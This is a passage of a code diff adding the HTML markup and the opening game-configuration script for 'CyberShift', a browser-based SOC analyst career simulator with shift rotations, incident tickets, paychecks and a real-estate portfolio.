@@ -1,0 +1,2019 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CyberShift — IT & Cybersecurity Career Simulator</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
+          }
+        }
+      }
+    };
+  </script>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #060913;
+      color: #e2e8f0;
+    }
+    .font-mono-code {
+      font-family: 'JetBrains Mono', monospace;
+    }
+    /* Subtle CRT / SOC grid background */
+    .soc-grid-bg {
+      background-image: 
+        radial-gradient(circle at 50% 0%, rgba(16, 185, 129, 0.08), transparent 55%),
+        linear-gradient(to right, rgba(30, 41, 59, 0.35) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(30, 41, 59, 0.35) 1px, transparent 1px);
+      background-size: 100% 100%, 32px 32px, 32px 32px;
+    }
+    /* Custom scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: rgba(15, 23, 42, 0.5);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: rgba(71, 85, 105, 0.6);
+      border-radius: 999px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: rgba(100, 116, 139, 0.85);
+    }
+    @keyframes pulseGlow {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.45; }
+    }
+    .animate-pulse-fast {
+      animation: pulseGlow 1.5s infinite;
+    }
+  </style>
+</head>
+<body class="soc-grid-bg min-h-screen flex flex-col selection:bg-emerald-500/30 selection:text-emerald-200">
+
+  <!-- ======================================================================= -->
+  <!-- TOP HUD / WORKSTATION STATUS BAR                                        -->
+  <!-- ======================================================================= -->
+  <header class="sticky top-0 z-30 bg-slate-950/90 backdrop-blur-md border-b border-slate-800/90 px-4 sm:px-6 py-3">
+    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-3">
+      
+      <!-- Brand & Career Rank -->
+      <div class="flex items-center gap-3">
+        <div class="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-mono-code font-bold text-lg shadow-[0_0_15px_rgba(16,185,129,0.2)]">
+          &gt;_
+        </div>
+        <div>
+          <div class="flex items-center gap-2">
+            <h1 class="font-bold text-base sm:text-lg tracking-tight text-white">CyberShift</h1>
+            <span id="hudRoleBadge" class="px-2 py-0.5 text-[10px] font-mono-code font-semibold uppercase tracking-wider rounded-md bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">
+              Tier 1 SOC Analyst
+            </span>
+          </div>
+          <p class="text-[11px] text-slate-400 font-mono-code mt-0.5">
+            Total Career Days: <span id="hudTotalDays" class="text-slate-200 font-semibold">0</span> • Passive Income: <span id="hudPassiveIncome" class="text-emerald-400 font-semibold">+$0/day</span>
+          </p>
+        </div>
+      </div>
+
+      <!-- Navigation Tabs -->
+      <nav class="flex items-center bg-slate-900/90 p-1 rounded-xl border border-slate-800 order-3 md:order-2 w-full md:w-auto justify-between md:justify-start">
+        <button data-nav="workstation" class="nav-tab-btn flex-1 md:flex-initial px-3.5 py-1.5 rounded-lg text-xs sm:text-sm font-semibold transition-all bg-slate-800 text-emerald-400 shadow-xs">
+          SOC Workstation
+        </button>
+        <button data-nav="realestate" class="nav-tab-btn flex-1 md:flex-initial px-3.5 py-1.5 rounded-lg text-xs sm:text-sm font-medium text-slate-400 hover:text-white transition-all flex items-center justify-center gap-1.5">
+          <span>Real Estate & Assets</span>
+          <span id="hudPropertyCount" class="px-1.5 py-0.2 text-[10px] font-bold rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">0</span>
+        </button>
+        <button data-nav="career" class="nav-tab-btn flex-1 md:flex-initial px-3.5 py-1.5 rounded-lg text-xs sm:text-sm font-medium text-slate-400 hover:text-white transition-all">
+          Career & Pay History
+        </button>
+      </nav>
+
+      <!-- Bank Balance & Shift Status -->
+      <div class="flex items-center gap-3 order-2 md:order-3">
+        <div class="bg-slate-900 border border-emerald-500/30 rounded-xl px-3.5 py-1.5 text-right shadow-inner">
+          <p class="text-[10px] uppercase tracking-wider text-slate-400 font-semibold">Net Bank Balance</p>
+          <p id="hudBankBalance" class="text-sm sm:text-base font-mono-code font-bold text-emerald-400">$2,500</p>
+        </div>
+      </div>
+
+    </div>
+  </header>
+
+  <!-- ======================================================================= -->
+  <!-- MAIN CONTENT CONTAINER                                                  -->
+  <!-- ======================================================================= -->
+  <main class="max-w-7xl mx-auto w-full flex-1 p-4 sm:p-6">
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 1: SOC WORKSTATION (SHIFT SETUP / ACTIVE SHIFT / PAYCHECK)       -->
+    <!-- ===================================================================== -->
+    <section id="viewWorkstation" class="space-y-6">
+
+      <!-- SUB-STATE A: SHIFT ROTATION SELECTOR (Shown before starting a shift block) -->
+      <div id="shiftSetupPanel" class="max-w-4xl mx-auto space-y-6">
+        <div class="bg-slate-900/85 border border-slate-800 rounded-2xl p-6 sm:p-8 shadow-2xl">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-slate-800">
+            <div>
+              <span class="text-xs font-mono-code uppercase tracking-wider text-emerald-400 font-semibold">// DEPLOYMENT SCHEDULER</span>
+              <h2 class="text-2xl sm:text-3xl font-extrabold text-white mt-1">Configure Your Work Rotation</h2>
+              <p class="text-sm text-slate-400 mt-1">
+                Select how many consecutive days you want to work. Longer rotations carry higher burnout risk but unlock bigger completion bonuses.
+              </p>
+            </div>
+            <div class="bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-xs font-mono-code space-y-1 flex-shrink-0">
+              <div class="text-slate-400">Current Role: <span id="setupRoleName" class="text-cyan-400 font-bold">Tier 1 SOC Analyst</span></div>
+              <div class="text-slate-400">Base Daily Rate: <span id="setupDailyRate" class="text-emerald-400 font-bold">$340 / day</span></div>
+              <div class="text-slate-400">Reputation XP: <span id="setupRepXP" class="text-amber-400 font-bold">0 / 1000</span></div>
+            </div>
+          </div>
+
+          <!-- Shift Length Options Grid -->
+          <div class="mt-6">
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-3">
+              1. Choose Shift Rotation Length
+            </label>
+            <div id="shiftLengthGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5">
+              <!-- Populated dynamically -->
+            </div>
+          </div>
+
+          <!-- Starting Role / Tier Selection (Unlocked or selectable if starting fresh) -->
+          <div class="mt-6">
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-3">
+              2. Active Career Tier (Promotions Unlock Automatically with Reputation)
+            </label>
+            <div id="roleTierGrid" class="grid grid-cols-1 md:grid-cols-3 gap-3.5">
+              <!-- Populated dynamically -->
+            </div>
+          </div>
+
+          <!-- Launch Shift CTA -->
+          <div class="mt-8 pt-6 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div class="text-xs text-slate-400">
+              <span class="text-emerald-400 font-semibold">Tip:</span> Use the <span class="font-mono-code text-slate-200">Threat Intel Lookup</span> tool during shifts before isolating servers to avoid costly false-positive downtime!
+            </div>
+            <button id="startRotationBtn" class="w-full sm:w-auto px-7 py-3.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-sm shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all flex items-center justify-center gap-2">
+              <span>Clock In & Start Rotation</span>
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUB-STATE B: ACTIVE WORKDAY SOC CONSOLE -->
+      <div id="activeWorkdayPanel" class="hidden space-y-5">
+        
+        <!-- Top Shift Telemetry Strip -->
+        <div class="grid grid-cols-2 lg:grid-cols-4 gap-3.5">
+          <!-- Day & Shift Block -->
+          <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4">
+            <div class="flex items-center justify-between text-xs text-slate-400">
+              <span>Rotation Progress</span>
+              <span id="shiftBlockBadge" class="font-mono-code text-[11px] px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400">09:00 AM</span>
+            </div>
+            <p id="workdayCounterText" class="text-lg sm:text-xl font-extrabold text-white mt-1">Day 1 of 5</p>
+            <p id="shiftPhaseName" class="text-xs text-cyan-400 font-medium mt-0.5">Morning SIEM Triage</p>
+          </div>
+
+          <!-- Company Security Posture -->
+          <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4">
+            <div class="flex items-center justify-between text-xs text-slate-400">
+              <span>Network Security</span>
+              <span id="securityScoreText" class="font-mono-code font-bold text-emerald-400">95%</span>
+            </div>
+            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden mt-2.5">
+              <div id="securityScoreBar" class="h-full bg-emerald-500 rounded-full transition-all duration-300" style="width: 95%"></div>
+            </div>
+            <p class="text-[11px] text-slate-400 mt-2">Keep &gt; 60% for Zero-Breach Bonus</p>
+          </div>
+
+          <!-- Stress & Burnout Meter -->
+          <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4">
+            <div class="flex items-center justify-between text-xs text-slate-400">
+              <span>Burnout / Stress</span>
+              <span id="stressScoreText" class="font-mono-code font-bold text-amber-400">15%</span>
+            </div>
+            <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden mt-2.5">
+              <div id="stressScoreBar" class="h-full bg-amber-500 rounded-full transition-all duration-300" style="width: 15%"></div>
+            </div>
+            <div class="flex items-center justify-between mt-1.5">
+              <span class="text-[11px] text-slate-400">100% = Mandatory Leave</span>
+              <button id="drinkCoffeeBtn" class="text-[11px] font-semibold text-cyan-400 hover:text-cyan-300 underline">
+                ☕ Espresso (-$12 / -15% Stress)
+              </button>
+            </div>
+          </div>
+
+          <!-- Today's Accrued Pay -->
+          <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-4">
+            <div class="flex items-center justify-between text-xs text-slate-400">
+              <span>Today's Accrued Pay</span>
+              <span class="font-mono-code text-[11px] text-emerald-400">LIVE</span>
+            </div>
+            <p id="todayAccruedPay" class="text-lg sm:text-xl font-mono-code font-extrabold text-emerald-400 mt-1">$340</p>
+            <p id="todayBonusText" class="text-[11px] text-slate-400 mt-0.5">Incident Bonuses: +$0</p>
+          </div>
+        </div>
+
+        <!-- Main Split Workspace: Left = Active Ticket & Logs | Right = Threat Intel & Live Feed -->
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-5">
+          
+          <!-- Left Column (7 cols): Incoming Incident / IT Ticket -->
+          <div class="lg:col-span-7 bg-slate-900/90 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-xl flex flex-col justify-between">
+            <div>
+              <!-- Ticket Header -->
+              <div class="flex flex-wrap items-center justify-between gap-2 pb-4 border-b border-slate-800">
+                <div class="flex items-center gap-2">
+                  <span id="ticketSeverityBadge" class="px-2.5 py-0.5 rounded-md text-[11px] font-mono-code font-bold uppercase bg-rose-500/20 text-rose-400 border border-rose-500/30">
+                    HIGH SEVERITY
+                  </span>
+                  <span id="ticketIdText" class="text-xs font-mono-code text-slate-400">INC-4092</span>
+                </div>
+                <span id="ticketCategoryTag" class="text-xs font-medium text-slate-400">SIEM Endpoint Alert</span>
+              </div>
+
+              <!-- Scenario Title & Narrative -->
+              <h3 id="ticketTitle" class="text-lg sm:text-xl font-bold text-white mt-4">
+                Suspicious Outbound PowerShell Beaconing
+              </h3>
+              <p id="ticketDescription" class="text-sm text-slate-300 mt-2 leading-relaxed">
+                EDR flagged workstation FIN-WS-04 spawning an encoded PowerShell process attempting outbound TLS connections to an unrecognized external IP.
+              </p>
+
+              <!-- Simulated Raw Log / Email Header / Terminal Box -->
+              <div class="mt-4 bg-slate-950 border border-slate-800 rounded-xl p-4 font-mono-code text-xs text-emerald-300/90 overflow-x-auto leading-relaxed">
+                <div class="flex items-center justify-between text-[10px] text-slate-500 pb-2 mb-2 border-b border-slate-800/80">
+                  <span>RAW TELEMETRY / PACKET CAPTURE</span>
+                  <span>UTF-8 • VERIFIED</span>
+                </div>
+                <pre id="ticketRawLog" class="whitespace-pre-wrap break-words"></pre>
+              </div>
+            </div>
+
+            <!-- Tactical Response Choices -->
+            <div class="mt-6 pt-5 border-t border-slate-800">
+              <p class="text-xs font-bold uppercase tracking-wider text-slate-400 mb-3">
+                Select Tactical Response Action:
+              </p>
+              <div id="ticketActionsContainer" class="space-y-2.5">
+                <!-- Populated dynamically -->
+              </div>
+
+              <!-- Outcome Resolution Feedback Box -->
+              <div id="ticketOutcomeBox" class="hidden mt-5 rounded-xl border p-4">
+                <div class="flex items-start gap-3">
+                  <div id="outcomeIcon" class="w-7 h-7 rounded-lg flex items-center justify-center font-bold text-sm flex-shrink-0"></div>
+                  <div class="flex-1">
+                    <h4 id="outcomeTitle" class="font-bold text-sm">Threat Contained!</h4>
+                    <p id="outcomeExplanation" class="text-xs sm:text-sm text-slate-300 mt-1 leading-relaxed"></p>
+                    <div id="outcomeDeltas" class="flex flex-wrap gap-2 mt-3 text-[11px] font-mono-code font-semibold"></div>
+                  </div>
+                </div>
+                <div class="mt-4 flex justify-end">
+                  <button id="advanceShiftBtn" class="px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-xs sm:text-sm transition-all flex items-center gap-1.5">
+                    <span id="advanceShiftBtnText">Continue Shift</span>
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                    </svg>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right Column (5 cols): Threat Intelligence Lookup Tool & Live SOC Feed -->
+          <div class="lg:col-span-5 space-y-5">
+            
+            <!-- Analyst Assist & Co-Worker Slack Comms Panel -->
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg">
+              <div class="flex items-center justify-between mb-3">
+                <div class="flex items-center gap-2">
+                  <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                  <h4 class="text-xs font-bold uppercase tracking-wider text-emerald-400 font-mono-code">SOC Playbook & Team Slack</h4>
+                </div>
+                <span id="assistTokensBadge" class="text-[11px] font-mono-code text-slate-400">Hints: 2/day • Pings: 2/day</span>
+              </div>
+
+              <!-- Tactical Playbook Hint Button -->
+              <div class="flex items-center justify-between gap-2 pb-3 border-b border-slate-800/80">
+                <span class="text-xs text-slate-400">Need a clue on what log field matters?</span>
+                <button id="requestHintBtn" type="button" class="px-3 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/40 text-amber-300 text-xs font-semibold transition-all flex-shrink-0">
+                  💡 Request Hint (-5 XP)
+                </button>
+              </div>
+
+              <!-- Hint Display Box -->
+              <div id="tacticalHintBox" class="hidden mt-3 p-3 rounded-xl bg-amber-950/35 border border-amber-500/35 text-xs text-amber-200 leading-relaxed"></div>
+
+              <!-- Ping a Co-Worker Selector -->
+              <div class="mt-3">
+                <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-400 mb-2">
+                  Ping a Co-Worker in #soc-incident-room (-10 XP):
+                </p>
+                <div class="grid grid-cols-3 gap-2">
+                  <button type="button" data-coworker="elena" class="ping-coworker-btn p-2 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-cyan-500/50 text-left transition-all">
+                    <div class="flex items-center gap-1.5">
+                      <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                      <span class="text-xs font-bold text-white">Elena</span>
+                    </div>
+                    <p class="text-[10px] text-cyan-400 font-mono-code mt-0.5">Threat Intel</p>
+                  </button>
+
+                  <button type="button" data-coworker="marcus" class="ping-coworker-btn p-2 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-cyan-500/50 text-left transition-all">
+                    <div class="flex items-center gap-1.5">
+                      <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                      <span class="text-xs font-bold text-white">Marcus</span>
+                    </div>
+                    <p class="text-[10px] text-indigo-400 font-mono-code mt-0.5">NetOps / Infra</p>
+                  </button>
+
+                  <button type="button" data-coworker="priya" class="ping-coworker-btn p-2 rounded-xl bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-cyan-500/50 text-left transition-all">
+                    <div class="flex items-center gap-1.5">
+                      <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                      <span class="text-xs font-bold text-white">Priya</span>
+                    </div>
+                    <p class="text-[10px] text-emerald-400 font-mono-code mt-0.5">Senior IR Lead</p>
+                  </button>
+                </div>
+              </div>
+
+              <!-- Live Slack Thread Output -->
+              <div id="slackChatBox" class="mt-3 bg-slate-950 border border-slate-800/90 rounded-xl p-3 text-xs space-y-2 min-h-[78px]">
+                <span class="text-slate-500 font-mono-code text-[11px]">// #soc-incident-room idle. Click a teammate above to ask for second-opinion triage help.</span>
+              </div>
+            </div>
+
+            <!-- SOC Threat Intel Scanner Tool -->
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg">
+              <div class="flex items-center justify-between mb-3">
+                <div class="flex items-center gap-2">
+                  <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
+                  <h4 class="text-xs font-bold uppercase tracking-wider text-cyan-400 font-mono-code">Threat Intel IOC Lookup</h4>
+                </div>
+                <span class="text-[11px] text-slate-500 font-mono-code">OSINT + EDR DB</span>
+              </div>
+              <p class="text-xs text-slate-400 mb-3">
+                Paste any IP address, domain, file hash, or username from the telemetry log to check reputation before acting.
+              </p>
+              <div class="flex gap-2">
+                <input
+                  id="iocSearchInput"
+                  type="text"
+                  placeholder="e.g., 185.220.101.44 or update.exe"
+                  class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-3 py-2 text-xs font-mono-code text-slate-200 focus:outline-none focus:border-cyan-500"
+                />
+                <button id="iocSearchBtn" class="px-3.5 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold transition-colors">
+                  Scan
+                </button>
+              </div>
+              <!-- Quick Clickable IOC Chips extracted from current ticket -->
+              <div id="quickIocChips" class="flex flex-wrap gap-1.5 mt-2.5"></div>
+
+              <!-- Scan Output Console -->
+              <div id="iocResultBox" class="mt-3 bg-slate-950 border border-slate-800/90 rounded-xl p-3 font-mono-code text-xs text-slate-300 min-h-[76px]">
+                <span class="text-slate-500">// Ready. Enter or click an indicator above to query threat intelligence feeds...</span>
+              </div>
+            </div>
+
+            <!-- Live Company / Network Activity Log -->
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-lg">
+              <div class="flex items-center justify-between mb-3">
+                <h4 class="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono-code">Live SOC Activity Feed</h4>
+                <span class="text-[11px] text-emerald-400 font-mono-code">● STREAMING</span>
+              </div>
+              <div id="liveSocFeed" class="space-y-2 max-h-56 overflow-y-auto font-mono-code text-[11px] pr-1">
+                <!-- Populated dynamically -->
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- SUB-STATE C: END-OF-DAY / ROTATION PAYCHECK STATEMENT -->
+      <div id="paycheckModalPanel" class="hidden max-w-2xl mx-auto">
+        <div class="bg-slate-900 border border-slate-700/80 rounded-2xl p-6 sm:p-8 shadow-2xl">
+          <div class="flex items-center justify-between pb-5 border-b border-slate-800">
+            <div>
+              <span id="paycheckHeaderTag" class="text-xs font-mono-code uppercase tracking-wider text-emerald-400 font-bold">
+                DIRECT DEPOSIT STATEMENT
+              </span>
+              <h2 id="paycheckTitle" class="text-2xl font-extrabold text-white mt-1">Shift Day 1 Complete</h2>
+            </div>
+            <div class="w-12 h-12 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-2xl">
+              💵
+            </div>
+          </div>
+
+          <!-- Itemized Pay Stub -->
+          <div class="my-6 bg-slate-950 border border-slate-800 rounded-2xl p-5 font-mono-code text-xs sm:text-sm space-y-3">
+            <div class="flex justify-between text-slate-300">
+              <span>Base Shift Salary (<span id="stubRoleLabel">Tier 1 SOC</span>)</span>
+              <span id="stubBasePay" class="text-white font-semibold">+$340</span>
+            </div>
+            <div class="flex justify-between text-slate-300">
+              <span>Incident Response & Triage Bonuses</span>
+              <span id="stubIncidentBonus" class="text-emerald-400 font-semibold">+$120</span>
+            </div>
+            <div class="flex justify-between text-slate-300">
+              <span>Zero-Breach SLA Bonus</span>
+              <span id="stubSlaBonus" class="text-emerald-400 font-semibold">+$100</span>
+            </div>
+            <div class="flex justify-between text-slate-300">
+              <span>Passive Real Estate & Node Income</span>
+              <span id="stubPassiveIncome" class="text-cyan-400 font-semibold">+$0</span>
+            </div>
+            <div id="stubRotationBonusRow" class="hidden flex justify-between text-amber-300">
+              <span>Multi-Day Rotation Completion Bonus</span>
+              <span id="stubRotationBonus" class="font-bold">+$0</span>
+            </div>
+            <div class="flex justify-between text-rose-400/90 pt-2 border-t border-slate-800/80">
+              <span>Taxes, Healthcare & Daily Living Costs</span>
+              <span id="stubExpenses">-$115</span>
+            </div>
+            <div class="flex justify-between text-base sm:text-lg font-bold text-emerald-400 pt-3 border-t border-slate-700">
+              <span>NET PAYOUT DEPOSITED</span>
+              <span id="stubNetTotal">+$445</span>
+            </div>
+          </div>
+
+          <!-- Promotion Notification Banner (If promoted!) -->
+          <div id="promotionBanner" class="hidden mb-6 p-4 rounded-xl bg-gradient-to-r from-amber-500/20 via-emerald-500/20 to-cyan-500/20 border border-amber-400/50">
+            <div class="flex items-center gap-3">
+              <span class="text-2xl">🎖️</span>
+              <div>
+                <h4 class="font-bold text-sm text-amber-300">PROMOTION UNLOCKED!</h4>
+                <p id="promotionText" class="text-xs text-slate-200 mt-0.5">
+                  You've been promoted to Incident Responder! Higher daily base pay unlocked.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Action Buttons -->
+          <div class="flex flex-col sm:flex-row gap-3">
+            <button id="paycheckNextActionBtn" class="flex-1 py-3.5 px-5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold text-sm transition-all shadow-lg shadow-emerald-500/20">
+              Start Next Shift Day →
+            </button>
+            <button id="paycheckGoMarketBtn" class="py-3.5 px-5 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-semibold text-sm transition-all">
+              Browse Real Estate Market
+            </button>
+          </div>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 2: REAL ESTATE & TECH ASSET PORTFOLIO                            -->
+    <!-- ===================================================================== -->
+    <section id="viewRealEstate" class="hidden space-y-6">
+      <!-- Header Banner -->
+      <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
+        <div>
+          <span class="text-xs font-mono-code uppercase tracking-wider text-emerald-400 font-semibold">// WEALTH & INFRASTRUCTURE PORTFOLIO</span>
+          <h2 class="text-2xl font-extrabold text-white mt-1">Real Estate & Tech Assets</h2>
+          <p class="text-sm text-slate-400 mt-1">
+            Invest your cybersecurity paychecks into properties and server nodes. Each property pays passive daily income and grants permanent career perks.
+          </p>
+        </div>
+        <div class="flex flex-wrap gap-3">
+          <div class="bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5">
+            <p class="text-[10px] uppercase tracking-wider text-slate-400">Available Cash</p>
+            <p id="reCashDisplay" class="text-lg font-mono-code font-bold text-emerald-400">$2,500</p>
+          </div>
+          <div class="bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5">
+            <p class="text-[10px] uppercase tracking-wider text-slate-400">Daily Passive Yield</p>
+            <p id="rePassiveDisplay" class="text-lg font-mono-code font-bold text-cyan-400">+$0 / day</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Toast Message for Property Purchases -->
+      <div id="propertyToast" class="hidden rounded-xl p-3.5 text-xs sm:text-sm font-semibold border transition-all"></div>
+
+      <!-- Properties Grid -->
+      <div id="propertiesGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
+        <!-- Populated dynamically -->
+      </div>
+    </section>
+
+    <!-- ===================================================================== -->
+    <!-- VIEW 3: CAREER STATS & PAYCHECK LEDGER                                -->
+    <!-- ===================================================================== -->
+    <section id="viewCareer" class="hidden space-y-6">
+      <!-- Career KPIs -->
+      <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+        <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5">
+          <p class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Total Days Worked</p>
+          <p id="statDaysWorked" class="text-2xl sm:text-3xl font-extrabold text-white mt-1">0</p>
+        </div>
+        <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5">
+          <p class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Tickets Resolved</p>
+          <p id="statTicketsResolved" class="text-2xl sm:text-3xl font-extrabold text-emerald-400 mt-1">0</p>
+        </div>
+        <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5">
+          <p class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Lifetime Earnings</p>
+          <p id="statLifetimeEarnings" class="text-2xl sm:text-3xl font-mono-code font-extrabold text-cyan-400 mt-1">$0</p>
+        </div>
+        <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-5">
+          <p class="text-xs uppercase tracking-wider text-slate-400 font-semibold">Portfolio Net Worth</p>
+          <p id="statNetWorth" class="text-2xl sm:text-3xl font-mono-code font-extrabold text-amber-400 mt-1">$2,500</p>
+        </div>
+      </div>
+
+      <!-- Paycheck History Ledger & Career Reset -->
+      <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-6">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-800">
+          <div>
+            <h3 class="text-lg font-bold text-white">Direct Deposit & Paycheck History</h3>
+            <p class="text-xs text-slate-400 mt-0.5">All progress is automatically saved to your browser's local storage.</p>
+          </div>
+          <button id="resetCareerBtn" class="px-4 py-2 rounded-xl border border-rose-500/40 bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 text-xs font-semibold transition-all">
+            Reset Career Save
+          </button>
+        </div>
+
+        <!-- Inline Reset Confirmation -->
+        <div id="careerResetConfirm" class="hidden mt-4 p-4 rounded-xl bg-rose-950/50 border border-rose-500/40 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
+          <p class="text-xs sm:text-sm text-rose-200 font-medium">
+            Wipe all bank funds, owned properties, promotions, and shift logs permanently?
+          </p>
+          <div class="flex gap-2">
+            <button id="confirmWipeBtn" class="px-3.5 py-1.5 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold">
+              Yes, Wipe Save
+            </button>
+            <button id="cancelWipeBtn" class="px-3.5 py-1.5 rounded-lg bg-slate-800 border border-slate-700 text-slate-200 text-xs font-semibold">
+              Cancel
+            </button>
+          </div>
+        </div>
+
+        <div id="payHistoryList" class="mt-5 space-y-2.5 max-h-96 overflow-y-auto">
+          <!-- Populated dynamically -->
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+    /**
+     * CyberShift — Realistic IT & Cybersecurity Career Simulator
+     * Self-contained single-file game engine with procedural/curated realistic SOC & IT tickets,
+     * Threat Intel OSINT lookup, itemized paycheck statements, real estate portfolio with passive yield,
+     * and localStorage save persistence.
+     */
+    (function () {
+      // =========================================================================
+      // 1. CAREER ROLES, SHIFT ROTATIONS & REAL ESTATE CATALOG
+      // =========================================================================
+      const ROLES = [
+        {
+          id: 'tier1',
+          title: 'Tier 1 SOC Analyst',
+          dailyPay: 340,
+          livingCost: 110,
+          minRep: 0,
+          desc: 'Frontline alert triage, phishing header analysis, and endpoint containment.'
+        },
+        {
+          id: 'tier2',
+          title: 'Incident Responder (DFIR)',
+          dailyPay: 540,
+          livingCost: 145,
+          minRep: 350,
+          desc: 'Active breach containment, ransomware lateral movement eradication, and forensics.'
+        },
+        {
+          id: 'tier3',
+          title: 'Principal Security Architect',
+          dailyPay: 850,
+          livingCost: 190,
+          minRep: 900,
+          desc: 'Zero-day emergency response, cloud IAM architecture, and executive risk governance.'
+        }
+      ];
+
+      const ROTATION_OPTIONS = [
+        {
+          days: 1,
+          label: '1-Day On-Call Cover',
+          tag: 'Quick Shift',
+          bonus: 75,
+          desc: 'Single 8-hour shift covering an analyst out sick. Low stress, quick payout.'
+        },
+        {
+          days: 3,
+          label: '3-Day Weekend Sprint',
+          tag: 'Popular',
+          bonus: 320,
+          desc: 'High-tempo 3-day security sprint. Solid rotation completion bonus.'
+        },
+        {
+          days: 5,
+          label: '5-Day Standard Workweek',
+          tag: 'Full Week',
+          bonus: 650,
+          desc: 'Monday through Friday enterprise operations with full SLA payout.'
+        },
+        {
+          days: 10,
+          label: '10-Day Red Alert Rotation',
+          tag: 'High Stakes',
+          bonus: 1650,
